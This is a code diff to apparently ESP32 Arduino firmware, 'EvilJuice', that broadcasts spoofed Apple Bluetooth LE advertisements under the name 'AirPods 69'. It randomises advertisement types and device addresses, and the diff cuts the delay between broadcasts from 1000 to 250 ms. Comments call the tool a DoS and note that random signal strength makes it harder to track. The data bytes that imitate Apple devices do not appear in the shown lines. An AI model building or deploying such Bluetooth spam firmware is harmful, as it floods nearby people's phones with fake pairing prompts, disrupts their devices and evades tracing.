@@ -1,9 +1,11 @@
+#include <Arduino.h>
+
 #include "evilblefuncts.h"
 #include "devices.h"
 
-int delayMilliseconds = 1000;
+int delayMilliseconds = 250;
 
-BLEAdvertising *pAdvertising;  // global variable
+BLEAdvertising *pSpamAdvertising;  // global variable
 
 void EvilJuiceSetup(){
   BLEDevice::init("AirPods 69");
@@ -14,11 +16,11 @@ void EvilJuiceSetup(){
   
   // Create the BLE Server
   BLEServer *pServer = BLEDevice::createServer();
-  pAdvertising = pServer->getAdvertising();
+  pSpamAdvertising = pServer->getAdvertising();
 
   // seems we need to init it with an address in setup() step.
   esp_bd_addr_t null_addr = {0xFE, 0xED, 0xC0, 0xFF, 0xEE, 0x69};
-  pAdvertising->setDeviceAddress(null_addr, BLE_ADDR_TYPE_RANDOM);
+  pSpamAdvertising->setDeviceAddress(null_addr, BLE_ADDR_TYPE_RANDOM);
 }
 
 void EvilJuiceLoop(){
@@ -76,16 +78,16 @@ void EvilJuiceLoop(){
 
   int adv_type_choice = random(3);
   if (adv_type_choice == 0){
-    pAdvertising->setAdvertisementType(ADV_TYPE_IND);
+    pSpamAdvertising->setAdvertisementType(ADV_TYPE_IND);
   } else if (adv_type_choice == 1){
-    pAdvertising->setAdvertisementType(ADV_TYPE_SCAN_IND);
+    pSpamAdvertising->setAdvertisementType(ADV_TYPE_SCAN_IND);
   } else {
-    pAdvertising->setAdvertisementType(ADV_TYPE_NONCONN_IND);
+    pSpamAdvertising->setAdvertisementType(ADV_TYPE_NONCONN_IND);
   }
 
   // Set the device address, advertisement data
-  pAdvertising->setDeviceAddress(dummy_addr, BLE_ADDR_TYPE_RANDOM);
-  pAdvertising->setAdvertisementData(oAdvertisementData);
+  pSpamAdvertising->setDeviceAddress(dummy_addr, BLE_ADDR_TYPE_RANDOM);
+  pSpamAdvertising->setAdvertisementData(oAdvertisementData);
 
   // Set advertising interval
   /*  According to Apple' Technical Q&A QA1931 (https://developer.apple.com/library/archive/qa/qa1931/_index.html), Apple recommends
@@ -94,16 +96,16 @@ void EvilJuiceLoop(){
       These lines of code fixes the interval to 20ms. Enabling these MIGHT increase the effectiveness of the DoS. Note this has not undergone thorough testing.
   */
 
-  //pAdvertising->setMinInterval(0x20);
-  //pAdvertising->setMaxInterval(0x20);
-  //pAdvertising->setMinPreferred(0x20);
-  //pAdvertising->setMaxPreferred(0x20);
+  //pSpamAdvertising->setMinInterval(0x20);
+  //pSpamAdvertising->setMaxInterval(0x20);
+  //pSpamAdvertising->setMinPreferred(0x20);
+  //pSpamAdvertising->setMaxPreferred(0x20);
 
   // Start advertising
-  Serial.println("Sending Advertisement...");
-  pAdvertising->start();
+  Serial.print("Sending Advertisement... ");
+  pSpamAdvertising->start();
   delay(delayMilliseconds); // delay for delayMilliseconds ms
-  pAdvertising->stop();
+  pSpamAdvertising->stop();
 
   // Random signal strength increases the difficulty of tracking the signal
   int rand_val = random(100);  // Generate a random number between 0 and 99
